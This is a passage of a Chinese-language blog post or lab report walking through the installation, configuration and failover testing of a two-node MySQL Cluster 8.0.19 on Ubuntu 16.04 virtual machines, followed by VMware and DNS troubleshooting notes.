<h4 id="2-3-2-准备阶段"><a href="#2-3-2-准备阶段" class="headerlink" title="2.3.2 准备阶段"></a>2.3.2 准备阶段</h4></li>
<li><p>针对<code>192.168.50.129</code>，安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 在命令行下</span><br><span class="line">sudo adduser mysql</span><br><span class="line">sudo usermod -aG sudo mysql</span><br></pre></td></tr></table></figure>
<img src="adduser.png">

<img src="usermod.png"></li>
<li><p>把下载的mysql-cluster_8.0.19-1ubuntu16.04_amd64.deb-bundle.tar从windows共享给虚拟机(通过共享文件夹)</p>
</li>
<li><p>将MySQL-Cluster的安装包放入虚拟机的指定目录install文件夹，操作如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 在命令行的根目录下</span><br><span class="line">mkdir install</span><br><span class="line"># 通过共享文件夹</span><br><span class="line">tar -xvf &#x2F;mnt&#x2F;hgfs&#x2F;xxx&#x2F;mysql-cluster_8.0.19-1ubuntu16.04_amd64.deb-bundle.tar -C install&#x2F;</span><br><span class="line">cd install</span><br></pre></td></tr></table></figure>
<img src="install.png"></li>
<li><p>安装<code>MySQL server binary</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 安装依赖包</span><br><span class="line">sudo apt update</span><br><span class="line"># sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br><span class="line"></span><br><span class="line">sudo apt-get install libaio1 libmecab2</span><br></pre></td></tr></table></figure>
<h4 id="2-3-3-安装配置集群管理器"><a href="#2-3-3-安装配置集群管理器" class="headerlink" title="2.3.3 安装配置集群管理器"></a>2.3.3 安装配置集群管理器</h4></li>
<li><p>用dpkg指令在Cluster Manager 服务器(为<strong>192.168.50.129</strong>)上安装ndb_mgmd</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 进入install目录</span><br><span class="line">sudo dpkg -i mysql-cluster-community-management-server_8.0.19-1ubuntu16.04_amd64.deb</span><br></pre></td></tr></table></figure>
<img src="dpkg.png"></li>
<li><p>在第一次运行ndb_mgmd前需要对其进行配置，正确配置是保证数据节点正确同步和负载分配的前提。</p>
</li>
<li><p>Cluster Manager 应该是MySQL Cluster 第一个启动的组件.它需要一个配置文件来加载参数. 我门创建配置文件: /var/lib/mysql-cluster/config.ini.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 从Windows编辑config.ini可能会报错，需要在Linux系统下编辑</span><br><span class="line"># 在Cluster Manager 所在机器上创建 &#x2F;var&#x2F;lib&#x2F;mysql-cluster目录:</span><br><span class="line">sudo mkdir &#x2F;var&#x2F;lib&#x2F;mysql-cluster</span><br><span class="line"></span><br><span class="line">sudo vim &#x2F;var&#x2F;lib&#x2F;mysql-cluster&#x2F;config.ini</span><br><span class="line"></span><br><span class="line"># 内容如下</span><br><span class="line">[ndbd default]</span><br><span class="line"># Options affecting ndbd processes on all data nodes:</span><br><span class="line">NoOfReplicas&#x3D;2  # Number of replicas</span><br><span class="line"></span><br><span class="line">[ndb_mgmd]</span><br><span class="line"># Management process options:</span><br><span class="line">hostname&#x3D;192.168.50.129  # Hostname of the manager</span><br><span class="line">NodeId&#x3D;1</span><br><span class="line">datadir&#x3D;&#x2F;var&#x2F;lib&#x2F;mysql-cluster  # Directory for the log files</span><br><span class="line"></span><br><span class="line">[ndbd]</span><br><span class="line">hostname&#x3D;192.168.50.128 # Hostname&#x2F;IP of the first data node</span><br><span class="line">NodeId&#x3D;11            # Node ID for this data node</span><br><span class="line">datadir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data   # Remote directory for the data files</span><br><span class="line"></span><br><span class="line">[ndbd]</span><br><span class="line">hostname&#x3D;192.168.50.129 # Hostname&#x2F;IP of the second data node</span><br><span class="line">NodeId&#x3D;12            # Node ID for this data node</span><br><span class="line">datadir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data   # Remote directory for the data files</span><br><span class="line"></span><br><span class="line">[mysqld]</span><br><span class="line"># SQL node options:</span><br><span class="line">hostname&#x3D;192.168.50.129 # MySQL server&#x2F;client i manager</span><br><span class="line"></span><br><span class="line">[mysqld]</span><br><span class="line"># SQL node options:</span><br><span class="line">hostname&#x3D;192.168.50.128 # MySQL server&#x2F;client i manager</span><br></pre></td></tr></table></figure>
<ul>
<li>[NDB_MGMD] 表示管理节点的配置，只能有一个</li>
<li>[NDBD DEFAULT] 表示每个数据节点的默认配置，在每个节点的[NDBD]中不用再写这些选项，只能有一个</li>
<li>[NDBD] 表示每个数据节点的配置，可以有多个</li>
<li>[MYSQLD] 表示SQL节点的配置，可以有多个，分别写上不同的SQL节点的ip地址；如不写，只保留一个空节点，表示任意一个ip地址都可以进行访问。此节点的个数表明了可以用来连接数据节点的SQL节点总数</li>
<li>每个节点都有一个独立的id号，可以填写，比如nodeid=2，老版本使用id，新版本已经不使用id标识了。不填写，系统会按照配置文件的填写顺序自动分配</li>
</ul>
<img src="config-ini.png"></li>
<li><p>如果是生产环境，应该根据实际情况调整配置参数，参考MySQL Cluster. 你还可以增加 data nodes (ndbd) 或 MySQL server nodes (mysqld).</p>
</li>
<li><p>启动管理器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查看是否有正在运行的服务进程</span><br><span class="line">ps -aux | grep ndb_mgmd</span><br><span class="line"></span><br><span class="line"># 在启动服务前，可能需要杀掉正在运行的服务:</span><br><span class="line">sudo pkill -f ndb_mgmd</span><br><span class="line"></span><br><span class="line"># 启动服务</span><br><span class="line">sudo ndb_mgmd -f &#x2F;var&#x2F;lib&#x2F;mysql-cluster&#x2F;config.ini</span><br><span class="line"></span><br><span class="line">#检查ndb_mgmd 使用的端口 1186</span><br><span class="line">sudo netstat -plntu</span><br></pre></td></tr></table></figure>
<img src="startndb_mgmd.png"></li>
<li><p>配置<strong>自动加载服务</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 在Ubuntu虚拟机下</span><br><span class="line"># 打开并编辑下面 systemd Unit 文件</span><br><span class="line">sudo vim &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;ndb_mgmd.service</span><br><span class="line"></span><br><span class="line"># 键入以下内容，保存并关闭</span><br><span class="line">[Unit]</span><br><span class="line">Description&#x3D;MySQL NDB Cluster Management Server</span><br><span class="line">After&#x3D;network.target auditd.service</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type&#x3D;forking</span><br><span class="line">ExecStart&#x3D;&#x2F;usr&#x2F;sbin&#x2F;ndb_mgmd -f &#x2F;var&#x2F;lib&#x2F;mysql-cluster&#x2F;config.ini</span><br><span class="line">ExecReload&#x3D;&#x2F;bin&#x2F;kill -HUP $MAINPID</span><br><span class="line">KillMode&#x3D;process</span><br><span class="line">Restart&#x3D;on-failure</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy&#x3D;multi-user.target</span><br><span class="line"></span><br><span class="line"># 上面只是加入了如何启动、停止和重启动ndb_mgmd进程的最小选项集合</span><br><span class="line"># more information，参阅[systemd manual](https:&#x2F;&#x2F;www.freedesktop.org&#x2F;software&#x2F;systemd&#x2F;man&#x2F;systemd.service.html).</span><br></pre></td></tr></table></figure>

<img src="ndbmgmdservice.png">

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># reload systemd’s manager configuration using daemon-reload</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line"></span><br><span class="line"># enable the service we just created</span><br><span class="line"># MySQL Cluster Manager starts on reboot</span><br><span class="line">sudo systemctl enable ndb_mgmd</span><br><span class="line"></span><br><span class="line"># start the service</span><br><span class="line">sudo systemctl start ndb_mgmd</span><br><span class="line"></span><br><span class="line"># verify that the NDB Cluster Management service is running</span><br><span class="line">sudo systemctl status ndb_mgmd</span><br></pre></td></tr></table></figure>
<ul>
<li><code>ndb_mgmd</code>MySQL Cluster Management server作为一个系统服务正在运行</li>
</ul>
<img src="systemctlenablendbmgmd.png"></li>
<li><p>设置<code>Cluster Manager</code>允许其它<code>MySQL Cluster</code>节点连入</p>
<ul>
<li>如果出现连接问题，则需要设置<code>ufw</code>防火墙，添加允许数据节点连入的规则<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo ufw allow from 192.168.50.128</span><br><span class="line">sudo ufw allow from 192.168.50.129</span><br></pre></td></tr></table></figure></li>
<li>会见到如下输出。此时<code>Cluster Manager</code>应该启动运行了，并且能够通过局域网与集群其它节点通信了。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rule added</span><br><span class="line"></span><br><span class="line"># 因为我之前配置过，所以会显示</span><br><span class="line">Rule updated</span><br></pre></td></tr></table></figure>
<h4 id="2-3-4-配置数据节点"><a href="#2-3-4-配置数据节点" class="headerlink" title="2.3.4 配置数据节点"></a>2.3.4 配置数据节点</h4></li>
</ul>
</li>
<li><p>假定在192.168.50.129上进行(同理另一个节点)</p>
</li>
<li><p>安装依赖包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 修复损坏的软件包，尝试卸载出错的包，重新安装正确版本的</span><br><span class="line">sudo apt-get –f install </span><br><span class="line">sudo apt install libclass-methodmaker-perl</span><br></pre></td></tr></table></figure></li>
<li><p>安装数据节点包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 进入install文件夹</span><br><span class="line">sudo dpkg -i mysql-cluster-community-data-node_8.0.19-1ubuntu16.04_amd64.deb</span><br></pre></td></tr></table></figure>
<img src="dpkg-data.png"></li>
<li><p>数据节点将从固定位置/etc/my.cnf获取配置文件.创建文件并编辑</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo vim &#x2F;etc&#x2F;my.cnf</span><br><span class="line"></span><br><span class="line"># 写入以下内容 两个虚拟机都一样</span><br><span class="line">[mysql_cluster]</span><br><span class="line"># Options for NDB Cluster processes:</span><br><span class="line">ndb-connectstring&#x3D;192.168.50.129  # location of cluster manager</span><br></pre></td></tr></table></figure>
<img src="myconf.png"></li>
<li><p>本配置设定在管理器配置数据目录为<code>/usr/local/mysql/data</code>。运行服务前要创建相关目录<code>sudo mkdir -p /usr/local/mysql/data</code>。在成功启动数据节点的时候，会向该文件夹中写入数据，如下图所示。</p>
<img src="data.png"></li>
<li><p>启动服务<code>sudo ndbd</code>，NDB 数据节点守护程序成功启动</p>
<img src="ndbstartsuccess.png">

<p>同理见<code>192.168.50.128</code>(192.168.50.129机器上的管理器服务要打开)</p>
<img src="ndbstartsuccess1.png"></li>
<li><p>如果出现连接问题，请打开防火墙：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo ufw allow from 192.168.50.129</span><br><span class="line">sudo ufw allow from 192.168.50.128</span><br></pre></td></tr></table></figure></li>
<li><p>同配置集群管理器类似，配置数据节点服务自启动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 打开并编辑如下 systemd Unit 文件</span><br><span class="line">sudo vim &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;ndbd.service</span><br><span class="line"></span><br><span class="line"># 内容如下：</span><br><span class="line">[Unit]</span><br><span class="line">Description&#x3D;MySQL NDB Data Node Daemon</span><br><span class="line">After&#x3D;network.target auditd.service</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type&#x3D;forking</span><br><span class="line">ExecStart&#x3D;&#x2F;usr&#x2F;sbin&#x2F;ndbd</span><br><span class="line">ExecReload&#x3D;&#x2F;bin&#x2F;kill -HUP $MAINPID</span><br><span class="line">KillMode&#x3D;process</span><br><span class="line">Restart&#x3D;on-failure</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy&#x3D;multi-user.target</span><br><span class="line"></span><br><span class="line"># 采用daemon-reload重新加载systemd’s manager配置</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line"></span><br><span class="line"># 让我们刚创建的服务生效，使data node daemon可以开机执行</span><br><span class="line">sudo systemctl enable ndbd</span><br><span class="line"></span><br><span class="line"># 启动服务</span><br><span class="line">sudo systemctl start ndbd</span><br><span class="line"></span><br><span class="line"># 禁止服务</span><br><span class="line">sudo systemctl stop ndbd</span><br><span class="line"></span><br><span class="line"># 验证NDB Cluster Management service服务正在执行</span><br><span class="line">sudo systemctl status ndbd</span><br></pre></td></tr></table></figure>
<img src="systemctlenablendbd.png"></li>
</ul>
<h4 id="2-3-5-配置并运行MySQL-Server和Client"><a href="#2-3-5-配置并运行MySQL-Server和Client" class="headerlink" title="2.3.5 配置并运行MySQL Server和Client"></a>2.3.5 配置并运行MySQL Server和Client</h4><ul>
<li><p>标准的MySQL server不支持 MySQL Cluster 引擎 NDB。这意味着我们需要安装含有定制的SQL服务器 MySQL Cluster软件。</p>
</li>
<li><p><code>192.168.50.129</code>和<code>192.168.50.128</code>都作为<code>MySQL Server node</code></p>
</li>
<li><p>进入包含MySQL Cluster组件的目录<code>cd install</code></p>
</li>
<li><p>在安装MySQL server 前，需要安装两个依赖库（如果已经安装过可忽略）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install libaio1 libmecab2</span><br></pre></td></tr></table></figure></li>
<li><p>安装解压在install目录的软件包中的一些MySQL Cluster依赖包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;install&#x2F;</span><br><span class="line">sudo dpkg -i mysql-common_8.0.19-1ubuntu16.04_amd64.deb</span><br><span class="line">sudo dpkg -i mysql-cluster-community-client-core_8.0.19-1ubuntu16.04_amd64.deb</span><br><span class="line">sudo dpkg -i mysql-cluster-community-client_8.0.19-1ubuntu16.04_amd64.deb</span><br><span class="line">sudo dpkg -i mysql-client_8.0.19-1ubuntu16.04_amd64.deb</span><br><span class="line">sudo dpkg -i mysql-cluster-community-server-core_8.0.19-1ubuntu16.04_amd64.deb</span><br><span class="line">sudo dpkg -i mysql-cluster-community-server_8.0.19-1ubuntu16.04_amd64.deb</span><br><span class="line"></span><br><span class="line"># 此处若是出现依赖问题，输入以下命令，再重新执行一遍上面语句 </span><br><span class="line">sudo apt-get -f install</span><br><span class="line"># 或者把依赖包删除 重装一遍</span><br><span class="line">sudo apt-get purge libaio1 </span><br><span class="line">sudo apt-get purge libmecab2</span><br></pre></td></tr></table></figure></li>
<li><p>当安装mysql-cluster-community-server时，会出现配置提示，请求为mysql数据库root用户设置密码。在后面选项选择使用<strong>强安全密码</strong></p>
<img src="password.png">

<img src="strongpw.png"></li>
<li><p>安装MySQL server:<code>sudo dpkg -i mysql-server_8.0.19-1ubuntu16.04_amd64.deb</code></p>
<img src="installmysqlserver.png"></li>
<li><p>配置MySQL server</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 打开MySQL Server 配置文件默认</span><br><span class="line">sudo vim &#x2F;etc&#x2F;mysql&#x2F;my.cnf</span><br></pre></td></tr></table></figure>
<ul>
<li><p>可看到下列文本</p>
<img src="mycnf.png"></li>
<li><p>往文本后追加(192.168.50.128填写的相同)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line"># Options for mysqld process:</span><br><span class="line">ndbcluster  # run NDB storage engine</span><br><span class="line"></span><br><span class="line">[mysql_cluster]</span><br><span class="line"># Options for NDB Cluster processes:</span><br><span class="line">ndb-connectstring&#x3D;192.168.50.129  # location of management server</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>重启MySQL server，使上面的变化生效:<code>sudo systemctl restart mysql</code></p>
</li>
<li><p>MySQL默认开机自动启动。如果不能启动，下述命令可以修复:<code>sudo systemctl enable mysql</code></p>
</li>
</ul>
<h4 id="2-3-6-验证MySQL-Cluster安装"><a href="#2-3-6-验证MySQL-Cluster安装" class="headerlink" title="2.3.6 验证MySQL Cluster安装"></a>2.3.6 验证MySQL Cluster安装</h4><ul>
<li><p>为了验证MySQL Cluster正确安装, 登陆Cluster Manager / SQL Server节点，为192.168.50.129/192.168.50.128。</p>
</li>
<li><p>打开MySQL客户端连接到root账号：<code>mysql -u root -p</code></p>
<img src="startmysql.png"></li>
<li><p>在MySQL客户端中, 运行下列命令:<br><code>SHOW ENGINE NDB STATUS \G</code>，系统会显示NDB引擎的相关信息，表示成功连入MySQL Cluster</p>
<img src="NDB.png"></li>
<li><p><code>number of ready_data_nodes= 2</code></p>
<ul>
<li><p>如果一个数据节点挂了（本例中必须是那个没有安装MySQL Cluster管理器的节点），MySQL cluster还是可以继续工作</p>
</li>
<li><p>测试cluster的稳定性</p>
<ul>
<li><p>shutting down非管理器节点（192.168.50.128），在整个过程中看到<code>number_of_ready_data_nodes</code>从2变为1。</p>
<img src="numberofreadydatanodes.gif"></li>
<li><p>再次开启服务，又由1变为2(这个变化过程有延迟，需要等待一会)。同理停止管理器节点上的ndbd服务。</p>
<img src="fullprocess.gif"></li>
</ul>
</li>
</ul>
</li>
<li><p>在集群管理器控制台上查看集群信息，命令为：<code>ndb_mgm</code>。然后在集群管理器控制台输入<code>SHOW</code>，输出信息如下：</p>
<ul>
<li><p>192.168.50.128的数据节点ndbd断开连接的情况</p>
<img src="ndbmgm.png"></li>
</ul>
</li>
</ul>
<ul>
<li><p>192.168.50.128的数据节点ndbd未断开连接的情况</p>
<img src="ndbmgm1.png">

<p>192.168.50.128的mysql服务器启动</p>
<img src="mysqldallconnect.png"></li>
<li><p>退出MySQL客户端，使用quit或按CTRL-D</p>
</li>
<li><p>管理控制台功能很多，有很多其他的管理命令来管理集群和数据, 包括创建在线备份. 更多信息参考官方<a href="https://dev.mysql.com/doc/refman/5.7/en/mysql-cluster-management.html">official MySQL documentation</a></p>
</li>
</ul>
<h4 id="2-3-7-向MySQL集群插入数据"><a href="#2-3-7-向MySQL集群插入数据" class="headerlink" title="2.3.7 向MySQL集群插入数据"></a>2.3.7 向MySQL集群插入数据</h4><ul>
<li><p>注意为了使用集群功能, 必须使用NDB数据库引擎。如果使用InnoDB (default)或其他引擎,将不能使用集群。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 打开MySQL客户端连接到root账号</span><br><span class="line">mysql -u root -p</span><br><span class="line"></span><br><span class="line"># 首先, 创建数据库clustertest:</span><br><span class="line">CREATE DATABASE clustertest;</span><br><span class="line"></span><br><span class="line"># 其次转到新数据库:</span><br><span class="line">USE clustertest;</span><br><span class="line"></span><br><span class="line"># 再次，创建表test_table:</span><br><span class="line"># 需要显式规定ndbcluster引擎</span><br><span class="line">CREATE TABLE test_table (name VARCHAR(20), value VARCHAR(20)) ENGINE&#x3D;ndbcluster;</span><br><span class="line"></span><br><span class="line"># 现在可以插入数据了:</span><br><span class="line">INSERT INTO test_table (name,value) VALUES(&#39;some_name&#39;,&#39;some_value&#39;);</span><br><span class="line"></span><br><span class="line"># 最后验证数据插入：</span><br><span class="line">SELECT * FROM test_table;</span><br><span class="line"></span><br><span class="line"># show databases</span><br></pre></td></tr></table></figure>
<img src="insertdata.png"></li>
<li><p><strong><a href="#251-ndb%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E%E6%B5%8B%E8%AF%95">思考：在本例中，数据被插入到了哪个机器？</a></strong></p>
<ul>
<li>我认为数据应该被插入了本地机器</li>
<li>在此处数据备份为2的话，则另一个数据节点有一份相同的备份</li>
</ul>
</li>
<li><p>可以在my.cnf文件中设定默认数据存储引擎为ndbcluster，这样创建表时就不再规定引擎了。更多信息参考<a href="https://dev.mysql.com/doc/refman/5.7/en/storage-engine-setting.html">MySQL Reference Manual</a></p>
</li>
</ul>
<h3 id="2-4-结语"><a href="#2-4-结语" class="headerlink" title="2.4 结语"></a>2.4 结语</h3><p>至此我们在Ubuntu 16.04 servers上安装和配置了a MySQL Cluster。需要注意的是这是一个很小的简化体系结构来说明配置过程，部署一个生产环境，还有许多其他的选项和特征需要去学习.。更多信息请参阅 <a href="https://dev.mysql.com/doc/refman/5.7/en/mysql-cluster.html">MySQL Cluster documentation</a></p>
<h3 id="2-5-验证可靠性"><a href="#2-5-验证可靠性" class="headerlink" title="2.5 验证可靠性"></a>2.5 验证可靠性</h3><h4 id="2-5-1-NDB存储引擎测试"><a href="#2-5-1-NDB存储引擎测试" class="headerlink" title="2.5.1 NDB存储引擎测试"></a>2.5.1 NDB存储引擎测试</h4><ul>
<li><p>在192.168.50.129的SQL节点创建数据库并且插入数据(一定要设置存储引擎为NDB)，在192.168.50.128的SQL节点可以查询到，<strong>两个SQL节点查询的数据时一致的，能够同步</strong></p>
<img src="databaseposition.png">

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use clustertest</span><br></pre></td></tr></table></figure>
<h4 id="2-5-2-单点故障测试"><a href="#2-5-2-单点故障测试" class="headerlink" title="2.5.2 单点故障测试"></a>2.5.2 单点故障测试</h4></li>
</ul>
<h5 id="SQL节点发生单点故障"><a href="#SQL节点发生单点故障" class="headerlink" title="SQL节点发生单点故障"></a>SQL节点发生单点故障</h5><ul>
<li><p>将SQL节点192.168.50.128上的MySQL服务停止</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;etc&#x2F;init.d&#x2F;mysqld stop</span><br><span class="line"># sudo systemctl stop mysql </span><br></pre></td></tr></table></figure></li>
<li><p>ndb_mgm查看cluster状态</p>
<img src="sqlnotonnect.png"></li>
<li><p>从SQL节点192.168.50.129上查看数据，正常</p>
<img src="onesqlfailed.png">

<img src="onesqlfailed.gif"></li>
<li><p>SQL节点的单点故障并没有引起数据查询的故障。对于应用来说，需要改变的就是将以前对故障节点的访问改为对非故障节点的访问</p>
</li>
</ul>
<h5 id="NDB-数据节点-单点故障"><a href="#NDB-数据节点-单点故障" class="headerlink" title="NDB(数据节点)单点故障"></a>NDB(数据节点)单点故障</h5><ul>
<li><p>在这个测试环境中，数据节点也是两个，那么他们对数据的存储是互相镜像还是一份数据分成几块存储呢？这个答案关键在于配置文件中[NDBD DEFAULT]组中的<strong>NoOfReplicas参数</strong>，如果这个参数等于1，表示只有一份数据，但是分成N块分别存储在N个数据节点上，如果该值等于2，则表示数据被分成N/2,每块数据都有两个备份，这样即使有任意一个节点发生故障，只要它的备份节点正常，数据就可以正常查询</p>
</li>
<li><p>将NDB节点192.168.50.129上的ndbd服务停止</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ps -ef | grep ndbd</span><br><span class="line">pkill -9 ndbd</span><br></pre></td></tr></table></figure></li>
<li><p>ndb_mgm查看cluster状态，NDB节点192.168.50.129上已经挂掉</p>
<img src="onendbfailed.png"></li>
<li><p>从SQL节点192.168.50.128和SQL节点192.168.50.129上查看数据，正常</p>
<img src="onenbdfailed.gif"></li>
<li><p>在此样例中，挂掉一个NDB节点不影响正常的数据查询，数据节点的冗余同样防止了NDB单点故障</p>
</li>
<li><p>如果该测试中，NoOfReplicas=1，如果有一个数据节点挂了，则无法正常访问完整数据</p>
</li>
</ul>
<h4 id="2-5-3-集群的关闭"><a href="#2-5-3-集群的关闭" class="headerlink" title="2.5.3 集群的关闭"></a>2.5.3 集群的关闭</h4><ul>
<li>关闭顺序：SQL节点-&gt;数据节点-&gt;管理节点</li>
<li>NDB节点和管理节点的关闭都可以在管理节点的管理程序中完成，也可以分节点关闭</li>
<li>关闭Cluster节点不会停止sql节点数据库服务</li>
<li>但在关闭整个MySQL Cluster环境(内部关闭：ndb_mgm&gt; shutdown)或者关闭某个SQL节点的时候，首先必须到SQL节点主机上来关闭SQL节点程序</li>
</ul>
<h3 id="2-6-思考问题"><a href="#2-6-思考问题" class="headerlink" title="2.6 思考问题"></a>2.6 思考问题</h3><ol>
<li>通过实验，你对一个分布式数据库系统有何理解？分布式数据库系统预计有何优越性？<ul>
<li>理解：分布在同一个网络；逻辑上属于同一个系统；物理上分布在不同的节点上</li>
<li>优越性：<ul>
<li>适合分布式数据管理，能有效地提高系统性能，吞吐率和响应速度提高</li>
<li>分布式数据库系统可利用现有的设备和系统，省时、省力、投资少</li>
<li>提高了系统的可用性、可靠性和并行执行度，并允许存储数据副本</li>
<li>根据实际需要，可增减某一场地，系统具有可扩展性</li>
<li>分布式数据库系统资源和数据分布在物理上不同的场地上，为系统所有用户共享</li>
</ul>
</li>
</ul>
</li>
<li><a href="#25-%E9%AA%8C%E8%AF%81%E5%8F%AF%E9%9D%A0%E6%80%A7">你能设计一个方案验证集群系统在可靠性上优于集中式数据库系统吗？</a><ul>
<li>集中式数据库，单点，崩了就完了</li>
</ul>
</li>
<li>同样是插入数据，你觉得MySQL Cluster和myCAT在实体完整性保持方面是否可能会有不同？为什么？<blockquote>
<p>Entity Integrity ensures that there are no duplicate records within the table and that the field that identifies each record within the table is unique and never null.</p>
</blockquote>
<ul>
<li>实体完整性要求每个数据表都必须有<strong>主键</strong>，而作为主键的所有字段，其属性必须是<strong>独一及非空值</strong></li>
<li>MySQL Cluster：auto-sharding，需要内存很大(被诟病)</li>
<li>myCAT: 分表分库，即将一个大表水平分割为 N个小表，存储在后端MySQL服务器里或者其他数据库里。早期myCAT没有检测，不同数据库的完整性无法保证，现在未知。</li>
</ul>
</li>
</ol>
<h2 id="3-问题与解决"><a href="#3-问题与解决" class="headerlink" title="3 问题与解决"></a>3 问题与解决</h2><ul>
<li><p>无法连接虚拟设备sata0:1</p>
<img src="cannotconnect.png">

<p>解决：修改虚拟机 -&gt; 右键设置硬件 -&gt; CD/DVD(SATA) -&gt; 使用 ISO 映像文件</p>
<p>但我认为这不影响虚拟机的使用所以就没深入解决</p>
</li>
<li><p>提供此类问题<code>temporary failure resolving cn.archive.ubuntu.com</code>的解决思路</p>
<img src="cannotresolve.png">

<ul>
<li>原因：无法解析该域名</li>
<li>试试<code>nslookup www.baidu.com</code></li>
<li>如果发现服务器的DNS没有配，则<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 打开配置文件</span><br><span class="line">vi &#x2F;etc&#x2F;resolv.conf</span><br><span class="line"></span><br><span class="line"># 添加</span><br><span class="line">nameserver 114.114.114.114</span><br><span class="line">nameserver 8.8.8.8</span><br><span class="line">nameserver 223.5.5.5</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>报错：该虚拟机似乎正在使用中。如果该虚拟机未在使用，请按”获取所有权(T)”按钮获取。获取所有权失败。原因:VM异常关闭导致。</p>
<img src="usingnow.png">

<p>解决：进入VM虚拟机的存放目录，删除后缀为.lck的文件</p>
</li>
<li><p><a href="https://www.cnblogs.com/Komorebi-john/p/11381053.html">VMware-以独占方式锁定此配置文件失败.另一个正在运行</a></p>
<ul>
<li>上述的方法都没有成功，通过<a href="https://blog.csdn.net/qq_34418601/article/details/91041411">在Windows程序与功能-&gt;修复vmware解决</a></li>
</ul>
</li>
<li><p><a href="https://www.linuxidc.com/Linux/2015-06/119021.htm">每次重启虚拟机后，<code>/etc/resolv.conf</code>文件就要重新配置，之前的都被抹去</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># resolv.conf文件其实是一个Link文件</span><br><span class="line"># 在Ubuntu中有一个 resolvconf的服务，这个服务用来控制&#x2F;etc&#x2F;resolv.conf的内容</span><br><span class="line"># 一旦我们重启了系统或者该服务，那么&#x2F;etc&#x2F;resolv.conf文件中的内容将被还原为原来的内容</span><br><span class="line"></span><br><span class="line">sudo vi &#x2F;etc&#x2F;resolvconf&#x2F;resolv.conf.d&#x2F;base</span><br><span class="line"># [应用更改](https:&#x2F;&#x2F;www.zhoushangren.com&#x2F;archives&#x2F;779)</span><br><span class="line">sudo resolvconf -u</span><br></pre></td></tr></table></figure></li>
<li><p><code>ping: unknown host www.baidu.com</code>的解决方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># ping 网关</span><br><span class="line">auto ens33</span><br><span class="line">iface ens33 inet dhcp</span><br></pre></td></tr></table></figure>
<h2 id="4-实验总结"><a href="#4-实验总结" class="headerlink" title="4 实验总结"></a>4 实验总结</h2></li>
<li><p>VMware挂起</p>
<ul>
<li>相当于物理机中的休眠，会将内存中的数据全部存放到对应的休眠文件中，占用的空间为内存大小，并且会对虚拟机执行关机操作</li>
<li>休眠后的虚拟机不占任何CPU、内存</li>
<li>相对于关机，只多了一个和内存大小相同的休眠文件</li>
</ul>
</li>
<li><p>VMware不像virtualbox可以从外部将虚拟机强行终止，VMware的虚拟机若是不正常关机，下一次启动会出现很多莫名其妙的问题。</p>
</li>
<li><p><code>sudo apt-get update</code>总是出问题的时候，通过科学上网、修改dns服务器、更改镜像源等操作后未果，可以不要选择大晚上执行命令，<del>太闹心，再也不做这种傻逼事</del>，放一放，换个时间可能会顺利很多。输入该命令之前可添加<code>sudo apt-get clean</code>，若是文件被锁住，则<code>ps -aux | grep apt*</code>获取有关进程的PID，然后<code>sudo kill PID</code>。</p>
</li>
<li><p>update和upgrade的区别：update是更新软件列表，upgrade是更新软件。在执行<code>upgrade</code>之前要先<code>update</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">update: 同步 &#x2F;etc&#x2F;apt&#x2F;sources.list 和 &#x2F;etc&#x2F;apt&#x2F;sources.list.d 中列出的源的索引</span><br><span class="line">upgrade：升级已安装的所有软件包，升级之后的版本就是本地索引里的</span><br></pre></td></tr></table></figure></li>
<li><p>apt和apt-get的区别</p>
<blockquote>
<p>apt = apt-get、apt-cache 和 apt-config 中最常用命令选项的集合</p>
<p>用 apt 替换部分 apt-get 系列命令，但不是全部</p>
</blockquote>
</li>
</ul>
<h2 id="5-参考资料"><a href="#5-参考资料" class="headerlink" title="5 参考资料"></a>5 参考资料</h2><ul>
<li><a href="https://www.cnblogs.com/huozf/p/9780747.html">在VMware Workstation中安装Ubuntu Server 16.04.5图解教程</a></li>
